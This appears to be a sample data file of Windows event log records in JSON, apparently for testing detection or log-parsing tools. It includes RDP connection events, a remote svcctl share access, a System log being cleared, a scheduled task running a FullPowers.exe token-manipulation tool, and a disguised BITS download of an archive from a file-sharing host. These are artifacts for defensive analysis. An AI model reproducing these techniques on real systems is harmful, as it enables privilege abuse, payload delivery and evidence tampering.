{"Timestamp": "2020-11-13 11:48:02.419160Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 13277, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "TCP", "IPPort": "10.0.2.16:52779"}
{"Timestamp": "2020-11-13 11:47:43.096750Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 13212, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "UDP", "IPPort": "[10.0.2.16]:61881"}
{"Timestamp": "2020-11-13 11:47:42.859086Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 13191, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "TCP", "IPPort": "10.0.2.16:52776"}
{"Timestamp": "2020-11-13 11:42:18.305936Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 13118, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "UDP", "IPPort": "[10.0.2.16]:55988"}
{"Timestamp": "2020-11-13 11:42:18.144337Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 13097, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "TCP", "IPPort": "10.0.2.16:52734"}
{"Timestamp": "2020-11-13 11:42:04.733450Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 13082, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "TCP", "IPPort": "10.0.2.16:52733"}
{"Timestamp": "2020-11-13 11:41:30.214149Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 13017, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "UDP", "IPPort": "[10.0.2.16]:64075"}
{"Timestamp": "2020-11-13 11:41:30.102922Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 12996, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "TCP", "IPPort": "10.0.2.16:52728"}
{"Timestamp": "2020-11-13 11:41:05.294891Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 12931, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "UDP", "IPPort": "[10.0.2.16]:64073"}
{"Timestamp": "2020-11-13 11:41:05.188967Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 12910, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "TCP", "IPPort": "10.0.2.16:52727"}
{"Timestamp": "2020-11-13 11:40:43.870395Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 12845, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "UDP", "IPPort": "[10.0.2.16]:64069"}
{"Timestamp": "2020-11-13 11:40:43.628034Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 12824, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "TCP", "IPPort": "10.0.2.16:52725"}
{"Timestamp": "2020-11-13 11:20:38.671306Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 12755, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "UDP", "IPPort": "[10.0.2.16]:53248"}
{"Timestamp": "2020-11-13 11:20:38.546691Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 12734, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "TCP", "IPPort": "10.0.2.16:52278"}
{"Timestamp": "2020-11-13 11:20:28.787280Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 12719, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "TCP", "IPPort": "10.0.2.16:52276"}
{"Timestamp": "2020-11-13 11:10:04.415902Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 12656, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "UDP", "IPPort": "[10.0.2.16]:59409"}
{"Timestamp": "2020-11-13 11:10:04.326375Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 12635, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "TCP", "IPPort": "10.0.2.16:52208"}
{"Timestamp": "2020-11-13 11:09:12.439959Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 12572, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "UDP", "IPPort": "[10.0.2.16]:59407"}
{"Timestamp": "2020-11-13 11:09:07.084053Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 12551, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "TCP", "IPPort": "10.0.2.16:52202"}
{"Timestamp": "2019-03-19 00:41:28.961628Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": "S-1-5-21-1587066498-1489273250-1035260531-500", "EventID": 5145, "RecordID": 568342, "Level": "0", "Descr": "A network share object was checked to see whether client can be granted desired access", "Username": "Administrator", "Domain": "EXAMPLE", "LogonId": "0x197dfa", "ObjectType": "File", "IP": "10.0.2.17", "Port": "49230", "ShareName": "\\\\*\\IPC$", "ShareLocalPath": null, "RelativeTargetName": "svcctl", "AccessMask": "0x12019f", "AccessList": "READ_CONTROL, SYNCHRONIZE, ReadData (or ListDirectory), WriteData (or AddFile), AppendData (or AddSubdirectory or CreatePipeInstance), ReadEA, WriteEA, ReadAttributes, WriteAttributes", "AccessReason": "-"}
{"Timestamp": "2020-09-15 19:28:31.453647Z", "Channel": "System", "Provider": "Microsoft-Windows-Eventlog", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": "S-1-5-21-308926384-506822093-3341789130-1106", "EventID": 104, "RecordID": 63220, "Level": "Information", "Descr": "The <EventLogName> log file was cleared", "Username": "a-jbrown", "Domain": "3B", "EventLogName": "System", "BackupPath": null}
{"Timestamp": "2020-03-07 13:17:39.984540Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-19", "EventID": 4699, "RecordID": 282590, "Level": "0", "Descr": "A scheduled task was deleted", "Username": "LOCAL SERVICE", "Domain": "NT AUTHORITY", "LogonId": "0x3e5", "TaskName": "\\FullPowersTask", "TaskContent": null}
{"Timestamp": "2020-03-07 13:17:38.534995Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-19", "EventID": 4698, "RecordID": 282588, "Level": "0", "Descr": "A scheduled task was created", "Username": "LOCAL SERVICE", "Domain": "NT AUTHORITY", "LogonId": "0x3e5", "TaskName": "\\FullPowersTask", "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <RegistrationInfo>\n    <URI>\\FullPowersTask</URI>\n  </RegistrationInfo>\n  <Triggers />\n  <Principals>\n    <Principal id=\"Author\">\n      <UserId>S-1-5-19</UserId>\n      <RunLevel>LeastPrivilege</RunLevel>\n      <RequiredPrivileges>\n        <Privilege>SeAssignPrimaryTokenPrivilege</Privilege>\n        <Privilege>SeAuditPrivilege</Privilege>\n        <Privilege>SeChangeNotifyPrivilege</Privilege>\n        <Privilege>SeCreateGlobalPrivilege</Privilege>\n        <Privilege>SeImpersonatePrivilege</Privilege>\n        <Privilege>SeIncreaseQuotaPrivilege</Privilege>\n        <Privilege>SeIncreaseWorkingSetPrivilege</Privilege>\n      </RequiredPrivileges>\n    </Principal>\n  </Principals>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n    <AllowHardTerminate>true</AllowHardTerminate>\n    <StartWhenAvailable>false</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <Duration>PT10M</Duration>\n      <WaitTimeout>PT1H</WaitTimeout>\n      <StopOnIdleEnd>true</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>true</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>false</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>\n    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>C:\\Users\\Public\\Tools\\TokenManip\\FullPowers.exe</Command>\n      <Arguments>-t 4932</Arguments>\n    </Exec>\n  </Actions>\n</Task>"}
{"Timestamp": "2020-07-03 08:55:51.356259Z", "Channel": "Microsoft-Windows-Bits-Client/Operational", "Provider": "Microsoft-Windows-Bits-Client", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-18", "EventID": 4, "RecordID": 2778, "Level": "Information", "Descr": "The transfer job is complete", "Username": "MSEDGEWIN10\\IEUser", "JobTitle": "Download LockScreen Image", "JobId": "FF819706-9FF9-490B-ADE5-B069232C5D23", "JobOwner": "MSEDGEWIN10\\IEUser", "FileCount": "1"}
{"Timestamp": "2020-07-03 08:55:51.349386Z", "Channel": "Microsoft-Windows-Bits-Client/Operational", "Provider": "Microsoft-Windows-Bits-Client", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-18", "EventID": 60, "RecordID": 2777, "Level": "Information", "Descr": "BITS stopped transferring the <Name> transfer job that is associated with the <URL>", "TransferId": "FCC284DB-AA62-40BB-B372-B5BA6A5AD840", "Name": "Download LockScreen Image", "JobId": "FF819706-9FF9-490B-ADE5-B069232C5D23", "URL": "https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z", "Peer": null, "FileTime": "2020-07-03 08:44:00 UTC", "FileSize": "162791", "BytesTotal": "162791", "BytesTransferred": "162791", "BytesTransferredFromPeer": "0"}
{"Timestamp": "2020-07-03 08:55:49.123471Z", "Channel": "Microsoft-Windows-Bits-Client/Operational", "Provider": "Microsoft-Windows-Bits-Client", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-18", "EventID": 59, "RecordID": 2776, "Level": "Information", "Descr": "BITS started the <Name> transfer job that is associated with the <URL>", "TransferId": "FCC284DB-AA62-40BB-B372-B5BA6A5AD840", "Name": "Download LockScreen Image", "JobId": "FF819706-9FF9-490B-ADE5-B069232C5D23", "URL": "https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z", "Peer": null, "FileTime": "2020-07-03 08:44:00 UTC", "FileSize": "162791"}
{"Timestamp": "2020-07-03 08:55:46.352339Z", "Channel": "Microsoft-Windows-Bits-Client/Operational", "Provider": "Microsoft-Windows-Bits-Client", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-18", "EventID": 3, "RecordID": 2774, "Level": "Information", "Descr": "The BITS service created a new job", "JobTitle": "Download LockScreen Image", "JobId": "FF819706-9FF9-490B-ADE5-B069232C5D23", "JobOwner": "MSEDGEWIN10\\IEUser", "ProcessPath": "C:\\Windows\\System32\\desktopimgdownldr.exe", "ProcessId": "1996"}